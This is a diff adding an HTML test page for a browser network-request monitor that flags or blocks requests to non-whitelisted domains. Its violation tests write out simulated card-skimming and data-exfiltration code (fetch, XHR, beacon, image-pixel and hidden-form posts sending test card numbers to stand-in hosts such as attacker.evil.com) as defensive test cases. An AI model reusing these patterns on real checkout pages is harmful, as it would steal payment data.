@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Request Monitor - Violation Testing</title>
+
+  <!-- Test Page Navigation -->
+  <script src="test-navigation.js"></script>
+
+  <!-- Load Network Request Monitor configuration -->
+  <script>
+    window.NETWORK_MONITOR_CONFIG = {
+      // Whitelisted destinations - only these are allowed
+      allowedDomains: [
+        window.location.origin,  // Same origin always allowed
+        'https://api.stripe.com',
+        'https://api.paypal.com'
+      ],
+      allowedEndpoints: [
+        '/api/payment',
+        '/api/checkout',
+        '/api/scripts/register',
+        '/api/scripts/status'
+      ],
+
+      // Server integration
+      serverBaseUrl: window.location.origin,
+      reportViolationEndpoint: '/api/network/violation',
+
+      // Monitoring options
+      monitorFetch: true,
+      monitorXHR: true,
+      monitorBeacon: true,
+      monitorFormSubmit: true,
+
+      // REPORT MODE - violations detected but NOT blocked
+      mode: 'report',
+
+      // Debug logging enabled
+      debug: true
+    };
+  </script>
+
+  <!-- Load Network Request Monitor -->
+  <script src="network-request-monitor.js"></script>
+
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      max-width: 1200px;
+      margin: 50px auto;
+      padding: 20px;
+      background: #f5f5f5;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #1976d2;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      color: #666;
+      margin-bottom: 30px;
+    }
+    .section {
+      margin: 30px 0;
+      padding: 20px;
+      border: 2px solid #e0e0e0;
+      border-radius: 8px;
+    }
+    .section h2 {
+      color: #333;
+      margin-top: 0;
+      font-size: 20px;
+    }
+    .section.report-mode {
+      border-color: #4caf50;
+      background: #f1f8f4;
+    }
+    .section.enforce-mode {
+      border-color: #f44336;
+      background: #ffebee;
+    }
+    .mode-badge {
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 4px;
+      font-weight: bold;
+      font-size: 14px;
+      margin-left: 10px;
+    }
+    .mode-badge.report {
+      background: #4caf50;
+      color: white;
+    }
+    .mode-badge.enforce {
+      background: #f44336;
+      color: white;
+    }
+    .test-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 15px;
+      margin: 20px 0;
+    }
+    .test-card {
+      background: white;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+    }
+    .test-card h3 {
+      margin: 0 0 10px 0;
+      font-size: 16px;
+      color: #333;
+    }
+    .test-card p {
+      margin: 0 0 15px 0;
+      font-size: 13px;
+      color: #666;
+    }
+    button {
+      width: 100%;
+      padding: 10px 16px;
+      background: #1976d2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    button:hover {
+      background: #1565c0;
+    }
+    button.danger {
+      background: #f44336;
+    }
+    button.danger:hover {
+      background: #d32f2f;
+    }
+    button.warning {
+      background: #ff9800;
+    }
+    button.warning:hover {
+      background: #f57c00;
+    }
+    button.success {
+      background: #4caf50;
+    }
+    button.success:hover {
+      background: #388e3c;
+    }
+    .status-panel {
+      margin: 20px 0;
+      padding: 20px;
+      background: #f8f9fa;
+      border-radius: 6px;
+      border: 1px solid #dee2e6;
+    }
+    .status-panel h3 {
+      margin: 0 0 15px 0;
+      color: #333;
+    }
+    .status-item {
+      margin: 10px 0;
+      padding: 12px;
+      background: white;
+      border-left: 4px solid #1976d2;
+      border-radius: 4px;
+    }
+    .status-item.violation {
+      border-left-color: #f44336;
+      background: #ffebee;
+    }
+    .status-item.allowed {
+      border-left-color: #4caf50;
+      background: #f1f8f4;
+    }
+    .violation-list {
+      max-height: 400px;
+      overflow-y: auto;
+    }
+    .violation-details {
+      font-size: 13px;
+      color: #666;
+      margin-top: 5px;
+    }
+    .instructions {
+      background: #e3f2fd;
+      border-left: 4px solid #2196f3;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 4px;
+    }
+    .instructions h3 {
+      margin-top: 0;
+      color: #1565c0;
+    }
+    .instructions ol {
+      margin: 10px 0;
+      padding-left: 20px;
+    }
+    .instructions li {
+      margin: 8px 0;
+    }
+    .mode-toggle {
+      margin: 20px 0;
+      padding: 20px;
+      background: #fff3cd;
+      border: 2px solid #ffc107;
+      border-radius: 8px;
+    }
+    .mode-toggle h3 {
+      margin: 0 0 10px 0;
+      color: #856404;
+    }
+    code {
+      background: #f5f5f5;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+    }
+    .stats {
+      display: flex;
+      gap: 20px;
+      margin: 20px 0;
+    }
+    .stat-box {
+      flex: 1;
+      padding: 15px;
+      background: white;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      text-align: center;
+    }
+    .stat-number {
+      font-size: 32px;
+      font-weight: bold;
+      color: #1976d2;
+    }
+    .stat-label {
+      font-size: 14px;
+      color: #666;
+      margin-top: 5px;
+    }
+    .stat-box.violations .stat-number {
+      color: #f44336;
+    }
+    .stat-box.allowed .stat-number {
+      color: #4caf50;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🌐 Network Request Monitor - Violation Testing</h1>
+    <p class="subtitle">Test page for detecting unauthorized data exfiltration and rogue script communications</p>
+
+    <div class="instructions">
+      <h3>📋 How to Use This Test Page</h3>
+      <ol>
+        <li>The Network Request Monitor is currently in <strong id="currentMode">REPORT</strong> mode</li>
+        <li>Click the test buttons below to trigger different types of network requests</li>
+        <li>Watch the <strong>Violations Log</strong> to see detected unauthorized requests</li>
+        <li>Check the <strong>browser console</strong> for detailed debug logs (🌐 [Network Monitor])</li>
+        <li>Toggle to <strong>ENFORCE</strong> mode to actively block unauthorized requests</li>
+      </ol>
+    </div>
+
+    <div class="mode-toggle">
+      <h3>⚙️ Enforcement Mode Control</h3>
+      <p>Current Mode: <span class="mode-badge" id="modeBadge">REPORT</span></p>
+      <p>
+        <strong>REPORT Mode:</strong> Violations detected and logged, but requests are allowed<br>
+        <strong>ENFORCE Mode:</strong> Unauthorized requests are actively blocked
+      </p>
+      <button id="toggleModeBtn" onclick="toggleEnforcementMode()">
+        Switch to ENFORCE Mode
+      </button>
+    </div>
+
+    <div class="stats">
+      <div class="stat-box">
+        <div class="stat-number" id="totalRequests">0</div>
+        <div class="stat-label">Total Requests</div>
+      </div>
+      <div class="stat-box violations">
+        <div class="stat-number" id="totalViolations">0</div>
+        <div class="stat-label">Violations Detected</div>
+      </div>
+      <div class="stat-box allowed">
+        <div class="stat-number" id="allowedRequests">0</div>
+        <div class="stat-label">Allowed Requests</div>
+      </div>
+    </div>
+
+    <!-- LEGITIMATE REQUESTS -->
+    <div class="section report-mode">
+      <h2>✅ Legitimate Requests (Whitelisted)</h2>
+      <p>These requests should be allowed by the monitor</p>
+
+      <div class="test-grid">
+        <div class="test-card">
+          <h3>Same-Origin Request</h3>
+          <p>Fetch request to same origin (always allowed)</p>
+          <button class="success" onclick="testSameOriginFetch()">Test Fetch</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Whitelisted Endpoint</h3>
+          <p>POST to <code>/api/payment</code></p>
+          <button class="success" onclick="testWhitelistedEndpoint()">Test Endpoint</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Stripe API</h3>
+          <p>Request to whitelisted domain</p>
+          <button class="success" onclick="testStripeAPI()">Test Stripe</button>
+        </div>
+
+        <div class="test-card">
+          <h3>PayPal API</h3>
+          <p>Request to whitelisted domain</p>
+          <button class="success" onclick="testPayPalAPI()">Test PayPal</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIOLATION TESTS -->
+    <div class="section enforce-mode">
+      <h2>🚫 Unauthorized Requests (Should Trigger Violations)</h2>
+      <p>These requests should be detected as violations</p>
+
+      <div class="test-grid">
+        <div class="test-card">
+          <h3>Data Exfiltration (Fetch)</h3>
+          <p>Attempt to send data to attacker domain</p>
+          <button class="danger" onclick="testDataExfiltrationFetch()">Test Exfiltration</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Rogue XHR Request</h3>
+          <p>XMLHttpRequest to unauthorized domain</p>
+          <button class="danger" onclick="testRogueXHR()">Test XHR</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Beacon Tracking</h3>
+          <p>sendBeacon to analytics domain</p>
+          <button class="danger" onclick="testBeaconTracking()">Test Beacon</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Third-Party API</h3>
+          <p>Request to non-whitelisted service</p>
+          <button class="danger" onclick="testThirdPartyAPI()">Test API</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Form Data Theft</h3>
+          <p>Form submission to attacker server</p>
+          <button class="danger" onclick="testFormDataTheft()">Test Form</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Image Beacon</h3>
+          <p>Data exfil via image src</p>
+          <button class="danger" onclick="testImageBeacon()">Test Image</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Credit Card Skimming</h3>
+          <p>Simulated card data exfiltration</p>
+          <button class="danger" onclick="testCreditCardSkimming()">Test Skimming</button>
+        </div>
+
+        <div class="test-card">
+          <h3>Multiple Endpoints</h3>
+          <p>Rapid-fire unauthorized requests</p>
+          <button class="warning" onclick="testMultipleViolations()">Test Multiple</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- STATUS AND VIOLATIONS -->
+    <div class="status-panel">
+      <h3>📊 Real-Time Violations Log</h3>
+      <div>
+        <button onclick="refreshStatus()">🔄 Refresh</button>
+        <button onclick="clearViolations()">🗑️ Clear Log</button>
+        <button onclick="viewConsoleLog()">📋 View Console</button>
+      </div>
+      <div class="violation-list" id="violationsList">
+        <div class="status-item">No violations detected yet. Click test buttons above.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Hidden form for testing -->
+  <form id="testForm" style="display:none;" method="POST" action="https://attacker.evil.com/steal">
+    <input type="text" name="cardNumber" value="4111111111111111">
+    <input type="text" name="cvv" value="123">
+  </form>
+
+  <script>
+    // Initialize the Network Request Monitor
+    let monitor = null;
+
+    window.addEventListener('DOMContentLoaded', function() {
+      if (window.NetworkRequestMonitor) {
+        monitor = new window.NetworkRequestMonitor(window.NETWORK_MONITOR_CONFIG);
+        monitor.initialize();
+        console.log('✅ Network Request Monitor initialized');
+
+        // Update UI
+        updateModeDisplay();
+
+        // Auto-refresh status every 3 seconds
+        setInterval(refreshStatus, 3000);
+      } else {
+        console.error('❌ NetworkRequestMonitor not loaded');
+        alert('Error: Network Request Monitor failed to load. Check console.');
+      }
+    });
+
+    // Mode toggle
+    function toggleEnforcementMode() {
+      const newMode = monitor.config.mode === 'report' ? 'enforce' : 'report';
+      monitor.config.mode = newMode;
+
+      updateModeDisplay();
+
+      console.log(`🔄 Switched to ${newMode.toUpperCase()} mode`);
+      alert(`Mode changed to: ${newMode.toUpperCase()}\n\n${
+        newMode === 'enforce'
+          ? 'Unauthorized requests will now be BLOCKED'
+          : 'Violations will be detected but NOT blocked'
+      }`);
+    }
+
+    function updateModeDisplay() {
+      const mode = monitor.config.mode;
+      const badge = document.getElementById('modeBadge');
+      const currentMode = document.getElementById('currentMode');
+      const toggleBtn = document.getElementById('toggleModeBtn');
+
+      badge.textContent = mode.toUpperCase();
+      badge.className = 'mode-badge ' + mode;
+      currentMode.textContent = mode.toUpperCase();
+
+      toggleBtn.textContent = mode === 'report'
+        ? 'Switch to ENFORCE Mode'
+        : 'Switch to REPORT Mode';
+    }
+
+    // ===== LEGITIMATE REQUEST TESTS =====
+
+    function testSameOriginFetch() {
+      console.log('🧪 Testing same-origin fetch...');
+      fetch('/api/scripts/status/test123')
+        .then(r => console.log('✅ Same-origin request completed'))
+        .catch(e => console.log('❌ Request failed:', e.message));
+    }
+
+    function testWhitelistedEndpoint() {
+      console.log('🧪 Testing whitelisted endpoint...');
+      fetch('/api/payment', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amount: 100 })
+      })
+        .then(r => console.log('✅ Whitelisted endpoint request completed'))
+        .catch(e => console.log('❌ Request failed:', e.message));
+    }
+
+    function testStripeAPI() {
+      console.log('🧪 Testing Stripe API (whitelisted)...');
+      fetch('https://api.stripe.com/v1/tokens', {
+        method: 'POST',
+        headers: { 'Authorization': 'Bearer test_key' }
+      })
+        .then(r => console.log('✅ Stripe API request completed'))
+        .catch(e => console.log('❌ Request failed:', e.message));
+    }
+
+    function testPayPalAPI() {
+      console.log('🧪 Testing PayPal API (whitelisted)...');
+      fetch('https://api.paypal.com/v1/payments', {
+        method: 'GET',
+        headers: { 'Authorization': 'Bearer test_token' }
+      })
+        .then(r => console.log('✅ PayPal API request completed'))
+        .catch(e => console.log('❌ Request failed:', e.message));
+    }
+
+    // ===== VIOLATION TESTS =====
+
+    function testDataExfiltrationFetch() {
+      console.log('🧪 Testing data exfiltration (fetch)...');
+      const cardData = {
+        cardNumber: '4111111111111111',
+        cvv: '123',
+        expiry: '12/25',
+        name: 'John Doe'
+      };
+
+      fetch('https://attacker.evil.com/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(cardData)
+      })
+        .then(r => console.log('⚠️ Exfiltration request completed (monitor should have detected this!)'))
+        .catch(e => console.log('🚫 Request blocked:', e.message));
+    }
+
+    function testRogueXHR() {
+      console.log('🧪 Testing rogue XHR request...');
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://malicious-analytics.com/track');
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.onload = () => console.log('⚠️ XHR request completed');
+      xhr.onerror = () => console.log('🚫 XHR blocked');
+      xhr.send(JSON.stringify({ userId: '12345', data: 'sensitive' }));
+    }
+
+    function testBeaconTracking() {
+      console.log('🧪 Testing beacon tracking...');
+      if (navigator.sendBeacon) {
+        const sent = navigator.sendBeacon(
+          'https://evil-analytics.com/beacon',
+          JSON.stringify({ event: 'page_view', timestamp: Date.now() })
+        );
+        console.log(sent ? '⚠️ Beacon sent' : '🚫 Beacon blocked');
+      }
+    }
+
+    function testThirdPartyAPI() {
+      console.log('🧪 Testing third-party API...');
+      fetch('https://api.github.com/users/test')
+        .then(r => console.log('⚠️ Third-party API request completed'))
+        .catch(e => console.log('🚫 Request blocked:', e.message));
+    }
+
+    function testFormDataTheft() {
+      console.log('🧪 Testing form data theft...');
+      const form = document.getElementById('testForm');
+
+      // Create and dispatch submit event
+      const submitEvent = new Event('submit', { bubbles: true, cancelable: true });
+      const prevented = !form.dispatchEvent(submitEvent);
+
+      if (prevented) {
+        console.log('🚫 Form submission blocked by monitor');
+      } else {
+        console.log('⚠️ Form would have submitted (monitor should have detected this!)');
+      }
+    }
+
+    function testImageBeacon() {
+      console.log('🧪 Testing image beacon...');
+      const img = new Image();
+      img.src = 'https://tracking.evil.com/pixel.gif?data=stolen&card=4111111111111111';
+      img.onload = () => console.log('⚠️ Image beacon loaded');
+      img.onerror = () => console.log('❌ Image failed to load');
+    }
+
+    function testCreditCardSkimming() {
+      console.log('🧪 Testing credit card skimming simulation...');
+      const skimmedData = {
+        type: 'payment',
+        card: {
+          number: '4111111111111111',
+          cvv: '123',
+          exp: '12/25'
+        },
+        billing: {
+          name: 'John Doe',
+          zip: '12345'
+        },
+        timestamp: new Date().toISOString(),
+        page: window.location.href
+      };
+
+      fetch('https://skimmer.attacker.com/api/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(skimmedData)
+      })
+        .then(r => console.log('⚠️ Skimming attempt completed'))
+        .catch(e => console.log('🚫 Skimming blocked:', e.message));
+    }
+
+    function testMultipleViolations() {
+      console.log('🧪 Testing multiple violations...');
+
+      const targets = [
+        'https://attacker1.com/steal',
+        'https://attacker2.com/collect',
+        'https://attacker3.com/exfil',
+        'https://badactor.net/gather',
+        'https://malware.org/send'
+      ];
+
+      targets.forEach((url, index) => {
+        setTimeout(() => {
+          fetch(url, {
+            method: 'POST',
+            body: JSON.stringify({ test: index })
+          })
+            .then(() => console.log(`⚠️ Request ${index + 1} completed`))
+            .catch(e => console.log(`🚫 Request ${index + 1} blocked`));
+        }, index * 100);
+      });
+    }
+
+    // ===== STATUS AND DISPLAY =====
+
+    function refreshStatus() {
+      if (!monitor) return;
+
+      const requestLog = monitor.getRequestLog();
+      const violations = monitor.getViolations();
+      const totalRequests = requestLog.length;
+      const violationsCount = violations.length;
+      const allowedCount = totalRequests - violationsCount;
+
+      // Update stats
+      document.getElementById('totalRequests').textContent = totalRequests;
+      document.getElementById('totalViolations').textContent = violationsCount;
+      document.getElementById('allowedRequests').textContent = allowedCount;
+
+      // Update violations list
+      const violationsList = document.getElementById('violationsList');
+
+      if (violationsCount === 0) {
+        violationsList.innerHTML = '<div class="status-item">No violations detected yet. Click test buttons above.</div>';
+        return;
+      }
+
+      let html = '';
+      violations.slice().reverse().forEach((v, index) => {
+        const timestamp = new Date(v.timestamp).toLocaleTimeString();
+        const blocked = v.blocked ? '🚫 BLOCKED' : '⚠️ DETECTED';
+
+        html += `
+          <div class="status-item violation">
+            <strong>${blocked} - ${v.requestType.toUpperCase()}</strong>
+            <div class="violation-details">
+              <div><strong>Destination:</strong> ${v.destinationUrl}</div>
+              <div><strong>Origin:</strong> ${v.destinationOrigin}</div>
+              <div><strong>Time:</strong> ${timestamp}</div>
+              <div><strong>Severity:</strong> ${v.severity}</div>
+            </div>
+          </div>
+        `;
+      });
+
+      violationsList.innerHTML = html;
+    }
+
+    function clearViolations() {
+      if (!monitor) return;
+
+      // Note: NetworkRequestMonitor doesn't provide a clear() method
+      // so we need to reinitialize the monitor
+      const config = monitor.config;
+      monitor = new window.NetworkRequestMonitor(config);
+      monitor.initialize();
+      refreshStatus();
+      console.log('🗑️ Monitor reinitialized - violations cleared');
+    }
+
+    function viewConsoleLog() {
+      console.log('%c=== NETWORK REQUEST MONITOR STATUS ===', 'background: #1976d2; color: white; font-weight: bold; padding: 10px;');
+      console.log('Configuration:', monitor.config);
+      console.log('Status:', monitor.getStatus());
+      console.log('Request Log:', monitor.getRequestLog());
+      console.log('Violations:', monitor.getViolations());
+      alert('📋 Check the browser console for detailed logs');
+    }
+  </script>
+</body>
+</html>
